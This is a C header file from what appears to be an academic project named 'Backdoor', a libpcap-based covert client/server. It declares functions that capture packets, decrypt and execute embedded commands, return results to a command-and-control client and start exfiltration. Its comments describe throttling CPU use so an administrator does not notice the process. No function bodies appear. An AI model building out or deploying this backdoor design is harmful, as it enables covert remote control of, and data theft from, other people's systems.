#ifndef CAPTURE_H
#define CAPTURE_H

/*
SOURCE FILE: capture.h

PROGRAM: Backdoor - A simple two in one backdoor client/server using libpcap

DATE: October 23, 2011

REVISIONS:
	1.0 - October 23

DESIGNERS:
	Martin Casado
	Modified by Aman Abdulla
  Modified by Santana Mach and Steve Stanisic

PROGRAMMERS:
  Modified by Santana Mach and Steve Stanisic

NOTES: This file contains functionality to start packet capture using
	libpcap. This has been modified to capture on all interfaces as
	we don't know which one our command and control client will be
	communicating with. We've also attempted to limit the rate at which
	libpcap busy loops so that we don't show up at the top of the
	process activity lists and tip off an admin.
*/

#include <pcap.h>
#include "defs.h"

/*
FUNCTION: pcap_init

PARAMS:
	const char* filter: The packet filter to apply.

RETURN: none.

NOTES: Call this function to ready libpcap for packet capture.
*/
void pcap_init(const char *filter);
/*
FUNCTION: srv_listen

PARAMS: int duplex

RETURN: none.

NOTES: Call this function to begin the listen loop.
*/
void srv_listen(int duplex);
/*
FUNCTION: execute

PARAMS:
	char *command: The command to execute.
	u_int32_t ip: The client ip in network byte order.
	u_int16_t port: The destination port in network byte order.
	int duplex: Whether we should send the response back or not.

RETURN: None.

NOTES: This method will execute the command and optionally send the
	encrypted results back to the client.
*/
void execute(char *command, u_int32_t ip, u_int16_t port, int duplex);
/*
FUNCTION: pkt_handler

PARAMS:
	u_char *user: This will hold our duplex bool.
	const struct pcap_pkthdr *pkt_inf: Information about the captured packet.
	const u_char *packet: The captured packet data.

RETURN: none.

NOTES: This function will be called any time a matching packet is captured,
	it will check for the proper header key and then attempt to decrypt and
	execute the command contained within.
*/
void pkt_handler(u_char *user, const struct pcap_pkthdr *pkt_info, const u_char *packet);
void exfil_start(uint32 ipaddr);

#endif
